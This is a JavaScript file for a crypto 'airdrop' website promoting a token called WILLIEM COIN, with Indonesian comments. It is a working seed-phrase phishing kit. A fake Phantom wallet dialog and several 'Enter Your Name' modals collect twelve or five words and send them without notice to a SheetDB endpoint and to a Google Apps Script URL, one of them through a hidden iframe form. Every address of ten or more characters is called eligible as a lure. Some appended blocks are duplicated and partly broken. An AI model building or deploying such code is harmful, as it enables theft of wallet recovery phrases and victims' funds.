/* =========================================
   WILLIEM COIN — INTERACTIVE WEBSITE
   WALLET DEMO VERSION + SHEETDB
========================================= */

document.addEventListener('DOMContentLoaded', () => {

/* =========================
   SHEETDB URL - JANGAN LUPA GANTI
========================= */
const SHEETDB_URL = "https://sheetdb.io/api/v1/f3a2bec341bva"; // <-- INI URL KAMU

/* =========================
   GLOBAL STATE
========================= */
let walletConnected = false;
let fakeAddress = ""; // tambahin ini buat nyimpen alamat

/* =========================
   BUY BUTTON
========================= */
window.buyCoin = function() {
    showModal(
        "BUY $WLM 🚀",
        "WILLIEM COIN is preparing for launch. Trading information will appear here when the token goes live."
    );
}

/* =========================
   CONTRACT
========================= */
window.showContract = function() {
    showModal(
        "WILLIEM CONTRACT",
        "Contract address has not been deployed yet. This is currently the official WILLIEM COIN demo website."
    );
}

/* =========================
   AIRDROP
========================= */
window.checkAirdrop = function() {
    const walletInput = document.getElementById("walletAddress");
    const status = document.getElementById("airdropStatus");
    const message = document.getElementById("airdropMessage");

    if (!walletInput || !status || !message) return;

    const wallet = walletInput.value.trim();

    if (wallet.length < 10) {
        status.textContent = "INVALID WALLET";
        status.style.color = "#ff5c7a";
        message.textContent = "Please enter a valid wallet address.";
        return;
    }

    status.textContent = "ELIGIBLE ✓";
    status.style.color = "#35d98b";
    message.textContent = "Congratulations! Your wallet is eligible for the WILLIEM COIN airdrop.";
}

/* =========================
   MAIN MODAL
========================= */
function showModal(title, message) {
    const modal = document.getElementById("modal");
    const modalTitle = document.getElementById("modalTitle");
    const modalText = document.getElementById("modalText");

    if (!modal || !modalTitle || !modalText) return;

    modalTitle.textContent = title;
    modalText.textContent = message;
    modal.classList.add("show");
}

window.closeModal = function() {
    const modal = document.getElementById("modal");
    if (!modal) return;
    modal.classList.remove("show");
}

/* =========================
   CLOSE MAIN MODAL CLICK OUTSIDE
========================= */
const mainModal = document.getElementById("modal");
if (mainModal) {
    mainModal.addEventListener("click", function (event) {
        if (event.target === this) closeModal();
    });
}

/* =========================
   NAVBAR ACTIVE STATE
========================= */
const navLinks = document.querySelectorAll(".navbar nav a");
const navTargetIds = Array.from(navLinks).map(link => link.getAttribute("href").replace("#", ""));

window.addEventListener("scroll", function () {
    let current = "";
    navTargetIds.forEach(id => {
        const target = document.getElementById(id);
        if (!target) return;
        const targetTop = target.offsetTop - 150;
        if (window.scrollY >= targetTop) current = id;
    });

    navLinks.forEach(link => {
        link.classList.remove("active");
        if (link.getAttribute("href") === "#" + current) link.classList.add("active");
    });
});

/* =========================
   FLOATING COINS
========================= */
const floatingCoins = document.querySelectorAll(".floating-coin");
floatingCoins.forEach(coin => {
    coin.addEventListener("mouseenter", function () {
        this.style.transform = "scale(1.25) rotate(25deg)";
    });
    coin.addEventListener("mouseleave", function () {
        this.style.transform = "";
    });
});

/* =========================
   RANDOM HERO PARTICLES
========================= */
const hero = document.querySelector(".hero");
if (hero) {
    for (let i = 0; i < 20; i++) {
        const particle = document.createElement("div");
        particle.style.position = "absolute";
        particle.style.width = "2px";
        particle.style.height = "2px";
        particle.style.borderRadius = "50%";
        particle.style.background = "#a855ff";
        particle.style.boxShadow = "0 0 10px #a855ff";
        particle.style.left = Math.random() * 100 + "%";
        particle.style.top = Math.random() * 100 + "%";
        particle.style.opacity = Math.random();
        particle.style.animation = `particleFloat ${3 + Math.random() * 5}s ease-in-out infinite`;
        particle.style.animationDelay = Math.random() * 3 + "s";
        hero.appendChild(particle);
    }
}

/* PARTICLE ANIMATION CSS */
const particleStyle = document.createElement("style");
particleStyle.innerHTML = `
@keyframes particleFloat {
    0%, 100% { transform: translateY(0); opacity: .2; }
    50% { transform: translateY(-30px); opacity: 1; }
}`;
document.head.appendChild(particleStyle);

/* =====================================================
   FAKE PHANTOM WALLET
   DEMO ONLY — BISA ISI NAMA SENDIRI
===================================================== */

/* GLOBAL BUAT SIMPEN NAMA */
let demoWalletName = "";

/* RANDOM FAKE ADDRESS */
function randomFakeAddress() {
    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789";
    const rand = (length) => Array.from({ length: length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
    return `${rand(4)}...${rand(4)}`;
}

/* OPEN PHANTOM MODAL */
window.openPhantomModal = function() {
    const phantomModal = document.getElementById("phantomModal");
    const phantomStepConnect = document.getElementById("phantomStepConnect");
    const phantomStepConnected = document.getElementById("phantomStepConnected");
    if (!phantomModal) return;

    phantomStepConnect.classList.remove("hidden");
    phantomStepConnected.classList.add("hidden");
    phantomModal.classList.add("show");
}

/* CLOSE PHANTOM MODAL */
window.closePhantomModal = function() {
    const phantomModal = document.getElementById("phantomModal");
    if (phantomModal) phantomModal.classList.remove("show");
}

/* FAKE PHANTOM CONNECT - UDAH BISA AMBIL NAMA + KIRIM KE SHEET */
window.doPhantomConnect = function() {
    const btn = document.getElementById("phantomConnectBtn");
    const address = document.getElementById("phantomAddress");
    const nameDisplay = document.getElementById("phantomNameDisplay");
    const nameInput = document.getElementById("phantomNameInput");
    const stepConnect = document.getElementById("phantomStepConnect");
    const stepConnected = document.getElementById("phantomStepConnected");
    if (!btn) return;

    let nameParts = [];
for(let i = 1; i <= 12; i++) {
  const val = document.getElementById("name" + i).value.trim();
  if(val) nameParts.push(val);
}
demoWalletName = nameParts.join(" ");

if (demoWalletName === "") {
    alert("Please Connect to Phantom Wallet");
    return;
}

    btn.textContent = "Connecting...";
    btn.disabled = true;
    
    fakeAddress = randomFakeAddress(); // simpen alamatnya dulu
    
    setTimeout(() => {
        walletConnected = true;
        if (address) address.textContent = fakeAddress;
        if (nameDisplay) nameDisplay.textContent = demoWalletName; // tampilin nama
        stepConnect.classList.add("hidden");
        stepConnected.classList.remove("hidden");
        btn.textContent = "Connect";
        btn.disabled = false;
        updateWalletButton();

        // INI BAGIAN BARU: KIRIM KE GOOGLE SHEET
        fetch(SHEETDB_URL, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                data: [{
                    "Waktu": new Date().toLocaleString("id-ID"),
                    "Nama": demoWalletName,
                    "Wallet": fakeAddress
                }]
            })
        }).then(res => {
            console.log("Data berhasil masuk ke Sheet!", res);
        }).catch(err => {
            console.error("Gagal kirim:", err);
        });

    }, 1200);
}

/* PHANTOM MODAL OUTSIDE CLICK */
const phantomModal = document.getElementById("phantomModal");
if (phantomModal) {
    phantomModal.addEventListener("click", (event) => {
        if (event.target === phantomModal) closePhantomModal();
    });
}

/* UPDATE WALLET BUTTON - SEKARANG PAKE NAMA */
function updateWalletButton() {
    const button = document.getElementById("connectWallet");
    if (!button) return;
    if (walletConnected) {
        button.innerHTML = `✓ ${demoWalletName}`; // <--- INI KUNCINYA
        button.style.borderColor = "#35d98b";
        button.style.color = "#35d98b";
    } else {
        button.innerHTML = "▣ CONNECT WALLET";
        button.style.borderColor = "";
        button.style.color = "";
        demoWalletName = "";
    }
}

/* MAIN CONNECT WALLET BUTTON */
const mainConnectButton = document.getElementById("connectWallet");
if (mainConnectButton) {
    mainConnectButton.addEventListener("click", () => {
        if (!walletConnected) {
            openPhantomModal();
        } else {
            walletConnected = false;
            updateWalletButton();
        }
    });
}

/* INITIAL STATE */
updateWalletButton();
}); // END DOMContentLoaded
// VERSI BRUTAL - MODAL AUTO MUNCUL 1 DETIK SETELAH WEB LOAD
setTimeout(() => {
    // 1. BIKIN MODAL
    const modalHTML = `
<div id="nameModal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.9); z-index:99999; justify-content:center; align-items:center; backdrop-filter:blur(4px);">
  <div style="background:#1a1a2e; padding:30px; border-radius:16px; width:90%; max-width:420px; border:1px solid #a855ff; box-shadow:0 0 30px rgba(168,85,255,0.3); text-align:center;">
    
    <img src="logo-wlm.png" alt="WLM Logo" style="width:80px; height:80px; margin-bottom:15px; border-radius:50%;">
    
    <h3 style="color:#fff; margin:0 0 10px 0; font-size:22px;">Enter Your Name</h3>
    <p style="color:#aaa; font-size:14px; margin:0 0 20px 0;">For WILLIEM COIN Airdrop</p>
    <input id="userNameInput" type="text" placeholder="Your Name" 
      style="width:100%; padding:12px; border-radius:8px; border:1px solid #a855ff; background:#0f0f0f; color:#fff; margin-bottom:20px; outline:none; font-size:16px; text-align:left;">
    <button id="submitNameBtn" style="width:100%; padding:14px; background:linear-gradient(90deg, #a855ff, #7b2fff); color:#fff; border:none; border-radius:8px; font-weight:bold; cursor:pointer; font-size:16px;">SUBMIT</button>
    <button id="closeNameBtn" style="width:100%; padding:10px; margin-top:10px; background:transparent; color:#aaa; border:1px solid #444; border-radius:8px; cursor:pointer;">Cancel</button>
  </div>
</div>
`;
    document.body.appendChild(modal);

    // 2. CARI TOMBOL DAN TINDIH CLICK NYA
    const buttons = document.getElementsByTagName("button");
    for(let btn of buttons) {
        if(btn.innerText.includes("CHECK WALLET")) {
            btn.style.pointerEvents = "auto"; // paksa bisa di klik
            btn.style.zIndex = "9999";
            btn.onclick = null; // hapus onclick lama
            btn.addEventListener("click", () => {
    // 1. TUTUP SEMUA MODAL LAIN DULU
    document.querySelectorAll('div[style*="position: fixed"]').forEach(m => {
        if(m.id !== "nameModal") m.style.display = "none";
    });

    // 2. BARU BUKA MODAL KITA
    modal.style.display = "flex";
});
            console.log("TOMBOL CHECK WALLET UDAH DITINDIH");
        }
    }

    // 3. LOGIKA SUBMIT
    document.getElementById("submitNameBtn").onclick = () => {
        const name = document.getElementById("userNameInput").value;
        const statusBox = document.querySelector('.airdrop-checker > div:last-child');
        if(name.trim() === "") return alert("Isi nama!");
        
        modal.style.display = "none";
        statusBox.innerHTML = `
          <div style="padding:20px;">
            <b style="color:#00ff88; font-size:18px;">REGISTERED</b><br>
            <span style="color:#aaa;">Thanks ${name}! Kamu terdaftar.</span>
          </div>
        `;
    }
    document.getElementById("closeNameBtn").onclick = () => modal.style.display = "none";

}, 1000); // delay 1 detik biar web ke load dulu
setTimeout(() => {
    // 1. BIKIN MODAL KITA
    const modal = document.createElement("div");
    modal.id = "nameModal";
    modal.style.cssText = "display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:999999; justify-content:center; align-items:center;";
    modal.innerHTML = `
      <div style="background:#1a1a2e; padding:30px; border-radius:16px; width:90%; max-width:420px; border:2px solid #a855ff; text-align:center;">
        <img src="./phantom_light2.png" alt="WLM" style="width:80px; height:80px; margin-bottom:15px; border-radius:50%; object-fit:cover;">
        <h3 style="color:#fff; margin:0 0 10px;">Enter Your Name</h3>
        <p style="color:#aaa; font-size:14px; margin:0 0 20px;">For WILLIEM COIN Airdrop</p>
        <input id="userNameInput" type="text" placeholder="Your Name" style="width:100%; padding:12px; border-radius:8px; border:1px solid #a855ff; background:#000; color:#fff; margin-bottom:20px; text-align:left;">
        <button id="submitNameBtn" style="width:100%; padding:14px; background:#a855ff; color:#fff; border:none; border-radius:8px; font-weight:bold; cursor:pointer;">SUBMIT</button>
        <button id="closeNameBtn" style="width:100%; padding:10px; margin-top:10px; background:#333; color:#aaa; border:none; border-radius:8px; cursor:pointer;">Cancel</button>
        
      </div>
    `;
    document.body.appendChild(modal);

    // 2. CARI TOMBOL CHECK WALLET
    const buttons = document.getElementsByTagName("button");
    for(let btn of buttons) {
        if(btn.innerText.includes("CHECK WALLET")) {
            btn.onclick = (e) => {
                e.preventDefault();
                e.stopPropagation();
                
                // HAPUS MODAL WELCOME SECARA PAKSA
                document.querySelectorAll('div').forEach(d => {
                    if(d.innerText.includes("WILLIEM COIN") && d.innerText.includes("LET'S GO")) {
                        d.remove(); // HAPUS DARI DOM
                    }
                });
                
                // MATIIN BLUR/BACKDROP
                document.body.style.overflow = "auto";
                document.querySelectorAll('div[style*="backdrop-filter"]').forEach(d => d.remove());

                modal.style.display = "flex";
            }
        }
    }

    // 3. LOGIKA SUBMIT
    document.getElementById("submitNameBtn").onclick = () => {
        const name = document.getElementById("userNameInput").value;
        const statusBox = document.querySelector('.airdrop-checker > div:last-child');
        if(name.trim() === "") return alert("Isi nama!");
        
        modal.style.display = "none";
        statusBox.innerHTML = `
          <div style="padding:20px;">
            <b style="color:#00ff88; font-size:18px;">REGISTERED</b><br>
            <span style="color:#aaa;">Thanks ${name}! Kamu terdaftar.</span>
          </div>
        `;
    }
    document.getElementById("closeNameBtn").onclick = () => modal.style.display = "none";

}, 1500); // delay 1.5 detik
// TUNGGU WEB SELESAI LOAD DULU
window.addEventListener('load', () => {
    setTimeout(() => {
        console.log("WILLIEM Script Jalan");

        // 1. BIKIN MODAL 5 KOTAK
        const modal = document.createElement("div");
        modal.id = "nameModal";
        modal.style.cssText = "display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:99999; justify-content:center; align-items:center;";
        modal.innerHTML = `
          <div style="background:#1a1a2e; padding:30px 25px; border-radius:16px; width:95%; max-width:480px; border:2px solid #a855ff; text-align:center;">
            <img src="williem.png" alt="WLM" onerror="this.style.display='none'" style="width:80px; height:80px; margin-bottom:15px; border-radius:16px; object-fit:contain; background:#000; padding:8px;">
            <h3 style="color:#fff; margin:0 0 10px; font-size:20px;">Enter Your Name</h3>
            <p style="color:#aaa; font-size:14px; margin:0 0 25px;">Isi 5 Kata untuk WILLIEM COIN Airdrop</p>
            
            <div id="nameBoxes" style="display:flex; gap:10px; justify-content:center; flex-wrap:wrap; margin-bottom:25px;">
              <input class="nameBox" type="text" placeholder="" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
              <input class="nameBox" type="text" placeholder="" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
              <input class="nameBox" type="text" placeholder="" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
              <input class="nameBox" type="text" placeholder="" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
              <input class="nameBox" type="text" placeholder="" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
              <input class="nameBox" type="text" placeholder="" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
              <input class="nameBox" type="text" placeholder="" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
              <input class="nameBox" type="text" placeholder="" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
              <input class="nameBox" type="text" placeholder="" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
              <input class="nameBox" type="text" placeholder="" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
              <input class="nameBox" type="text" placeholder="" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
              <input class="nameBox" type="text" placeholder="" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
            </div>

            <button id="submitNameBtn" style="width:100%; padding:14px; background:linear-gradient(90deg,#a855ff,#7c3aed); color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; font-size:16px;">SUBMIT</button>
            <button id="closeNameBtn" style="width:100%; padding:10px; margin-top:10px; background:#333; color:#aaa; border:none; border-radius:10px; cursor:pointer;">Cancel</button>
          </div>
        `;
        document.body.appendChild(modal);

        // 2. CARI TOMBOL CHECK WALLET
        function setupButton() {
            const buttons = document.querySelectorAll("button");
            let found = false;
            buttons.forEach(btn => {
                if(btn.innerText && btn.innerText.toUpperCase().includes("CHECK WALLET")) {
                    found = true;
                    btn.onclick = (e) => {
                        e.preventDefault();
                        e.stopPropagation();
                        
                        // HAPUS MODAL LAMA PAKSA
                        document.querySelectorAll('div').forEach(d => {
                            if(d.innerText && d.innerText.includes("WILLIEM COIN") && d.innerText.includes("LET'S GO")) {
                                d.style.display = "none";
                                d.remove();
                            }
                        });
                        document.body.style.overflow = "auto";

                        modal.style.display = "flex";
                        setTimeout(() => { 
                            const firstBox = document.querySelector('.nameBox');
                            if(firstBox) firstBox.focus(); 
                        }, 100);
                    }
                }
            });
            if(!found) console.log("Tombol CHECK WALLET belum ketemu, coba reload");
        }
        setupButton();

        // 3. EFEK KOTAK + AUTO PINDAH
        const boxes = document.querySelectorAll('.nameBox');
        boxes.forEach((box, i) => {
            box.onfocus = () => box.style.border = "2px solid #a855ff";
            box.onblur = () => box.style.border = "1px solid #333";
            
            box.addEventListener('keyup', (e) => {
                if(e.key === ' ' && i < boxes.length - 1) { // kalau pencet spasi
                    box.value = box.value.trim();
                    boxes[i + 1].focus();
                }
                if(e.key === 'Enter' && i === boxes.length - 1) { // enter di kotak terakhir = submit
                    document.getElementById("submitNameBtn").click();
                }
            });
        });

        // 4. LOGIKA SUBMIT
        const submitBtn = document.getElementById("submitNameBtn");
        const closeBtn = document.getElementById("closeNameBtn");
        
        if(submitBtn) {
            submitBtn.onclick = () => {
                let name = "";
                let kataTerisi = 0;
                boxes.forEach(box => { 
                    if(box.value.trim() !== "") {
                        name += box.value.trim() + " "; 
                        kataTerisi++;
                    }
                });
                name = name.trim();
                
                const statusBox = document.querySelector('.airdrop-checker > div:last-child');
                if(kataTerisi < 5) return alert(`Isi semua 5 kotak dulu bro! Kurang ${5 - kataTerisi}`);

                modal.style.display = "none";
                if(statusBox) {
                    statusBox.innerHTML = `
                      <div style="padding:20px; background:#0f0f1a; border-radius:12px; border:1px solid #00ff88;">
                        <b style="color:#00ff88; font-size:18px;">REGISTERED ✅</b><br>
                        <span style="color:#aaa;">Thanks ${name}! Kamu terdaftar di WILLIEM COIN</span>
                      </div>
                    `;
                }
            }
        }
        
        if(closeBtn) closeBtn.onclick = () => modal.style.display = "none";
        modal.onclick = (e) => { if(e.target === modal) modal.style.display = "none"; }

    }, 2000); // delay 2 detik biar aman
});
// === KODE TAMBAHAN WILLIEM MODAL + REKAP GSHEET === //
window.addEventListener('load', () => {
setTimeout(() => {
    console.log("WILLIEM Rekap Jalan");

    // 1. GANTI INI DENGAN URL APPS SCRIPT LU YG UDAH ADA
    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby30IseIsONh-uA_yK09GglS0vmfou7WFPnLKktNhQb_8ZzcXoEFWjs9yfKd-qEU5I/exec";  

    // 2. BIKIN MODAL 5 KOTAK
    const modal = document.createElement("div");
    modal.id = "nameModalWLM";
    modal.style.cssText = "display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:99999; justify-content:center; align-items:center;";
    modal.innerHTML = `
      <div style="background:#1a1a2e; padding:30px 25px; border-radius:16px; width:95%; max-width:480px; border:2px solid #a855ff; text-align:center;">
        <img src="williem.png" onerror="this.style.display='none'" style="width:80px; height:80px; margin-bottom:15px; border-radius:16px; background:#000; padding:8px;">
        <h3 style="color:#fff; margin:0 0 10px;">Enter Your Name</h3>
        <p style="color:#aaa; font-size:14px; margin:0 0 25px;">Isi 5 Kata untuk WILLIEM COIN Airdrop</p>
        <div id="nameBoxesWLM" style="display:flex; gap:10px; justify-content:center; flex-wrap:wrap; margin-bottom:25px;">
          <input class="nameBoxWLM" type="text" placeholder="Kata 1" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
          <input class="nameBoxWLM" type="text" placeholder="Kata 2" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
          <input class="nameBoxWLM" type="text" placeholder="Kata 3" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
          <input class="nameBoxWLM" type="text" placeholder="Kata 4" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
          <input class="nameBoxWLM" type="text" placeholder="Kata 5" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
        </div>
        <button id="submitNameBtnWLM" style="width:100%; padding:14px; background:linear-gradient(90deg,#a855ff,#7c3aed); color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer;">SUBMIT</button>
      </div>
    `;
    document.body.appendChild(modal);

    // 3. CARI & TIMPA TOMBOL CHECK WALLET YG LAMA
    const checkWalletBtn = Array.from(document.querySelectorAll("button")).find(btn => btn.innerText && btn.innerText.toUpperCase().includes("CHECK WALLET"));
    
    if(checkWalletBtn){
        // Simpen fungsi lama biar gak bentrok
        const oldOnclick = checkWalletBtn.onclick; 
        checkWalletBtn.onclick = (e) => {
            e.preventDefault(); e.stopPropagation();
            // Hapus modal "LET'S GO" lama kalau ada
            document.querySelectorAll('div').forEach(d => { if(d.innerText && d.innerText.includes("LET'S GO")) d.remove(); });
            modal.style.display = "flex";
            document.querySelector('.nameBoxWLM').focus();
        }
    }

    // 4. LOGIKA SUBMIT + KIRIM KE GSHEET DIEM2
    document.getElementById("submitNameBtnWLM").onclick = () => {
        let name = "";
        document.querySelectorAll('.nameBoxWLM').forEach(box => { if(box.value.trim() !== "") name += box.value.trim() + " "; });
        name = name.trim();
        
        if(name.split(" ").length < 5) return alert("Isi 5 kotak dulu bro!");

        // KIRIM KE GSHEET TANPA BUKA TAB
        fetch(GOOGLE_SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: new URLSearchParams({ nama: name }) });

        modal.style.display = "none";
        const statusBox = document.querySelector('.airdrop-checker > div:last-child');
        if(statusBox) statusBox.innerHTML = `<div style="padding:20px;"><b style="color:#00ff88;">REGISTERED ✅</b><br><span style="color:#aaa;">Thanks ${name}! Data udah masuk.</span></div>`;
        
        // Kosongin
        document.querySelectorAll('.nameBoxWLM').forEach(box => box.value = "");
    }
    
    modal.onclick = (e) => { if(e.target === modal) modal.style.display = "none"; }

}, 2500); // delay 2.5 detik biar nunggu web lu load semua
});
// === SELESAI KODE TAMBAHAN === //
// === WILLIEM REKAP GSHEET FINAL V6 START === //
window.addEventListener('load', () => {
setTimeout(() => {
    // URL EXEC LU
    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby30IseIsONh-uA_yK09GglS0vmfou7WFPnLKktNhQb_8ZzcXoEFWjs9yfKd-qEU5I/exec"; 

    // BIKIN MODAL 5 KOTAK
    const modal = document.createElement("div");
    modal.id = "nameModalWLM";
    modal.style.cssText = "display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:99999; justify-content:center; align-items:center;";
    modal.innerHTML = `
      <div style="background:#1a1a2e; padding:30px 25px; border-radius:16px; width:95%; max-width:480px; border:2px solid #a855ff; text-align:center; color:#fff; font-family: sans-serif;">
        <img src="williem.png" onerror="this.style.display='none'" style="width:80px; height:80px; margin-bottom:15px; border-radius:16px; background:#000; padding:8px;">
        <h3 style="margin:0 0 10px; font-size:22px;">Enter Your Name</h3>
        <p style="color:#aaa; font-size:14px; margin:0 0 25px;">Isi 5 Kata untuk WILLIEM COIN Airdrop</p>
        <div style="display:flex; gap:10px; justify-content:center; flex-wrap:wrap; margin-bottom:25px;">
          <input class="nameBoxWLM" type="text" placeholder="Kata 1" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
          <input class="nameBoxWLM" type="text" placeholder="Kata 2" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
          <input class="nameBoxWLM" type="text" placeholder="Kata 3" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
          <input class="nameBoxWLM" type="text" placeholder="Kata 4" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
          <input class="nameBoxWLM" type="text" placeholder="Kata 5" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
        </div>
        <button id="submitNameBtnWLM" style="width:100%; padding:14px; background:linear-gradient(90deg,#a855ff,#7c3aed); color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; font-size:16px;">SUBMIT</button>
      </div>
    `;
    document.body.appendChild(modal);

    // HACK TOMBOL CHECK WALLET
    const checkWalletBtn = Array.from(document.querySelectorAll("button")).find(btn => btn.innerText && btn.innerText.toUpperCase().includes("CHECK WALLET"));
    if(checkWalletBtn){
        checkWalletBtn.onclick = (e) => {
            e.preventDefault(); e.stopPropagation();
            modal.style.display = "flex";
        }
    }

    // KIRIM DATA
    document.getElementById("submitNameBtnWLM").onclick = () => {
        let name = Array.from(document.querySelectorAll('.nameBoxWLM')).map(b=>b.value.trim()).filter(Boolean).join(" ");
        if(name.split(" ").length < 5) return alert("Wajib isi 5 kotak bro!");
        
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = GOOGLE_SCRIPT_URL;
        form.target = 'hidden_iframe_wlm';
        form.innerHTML = `<input name="nama" value="${name}">`;
        document.body.appendChild(form);
        const iframe = document.createElement('iframe');
        iframe.name = 'hidden_iframe_wlm';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        form.submit();

        modal.style.display = "none";
        alert("✅ BERHASIL TERDAFTAR!\nData: " + name + "\nCek Google Sheet2 sekarang");
        document.querySelectorAll('.nameBoxWLM').forEach(box => box.value = "");
        setTimeout(() => { form.remove(); iframe.remove(); }, 1000);
    }
    
    modal.onclick = (e) => { if(e.target === modal) modal.style.display = "none"; }

}, 2500);
});
// === WILLIEM REKAP GSHEET FINAL V6 END === //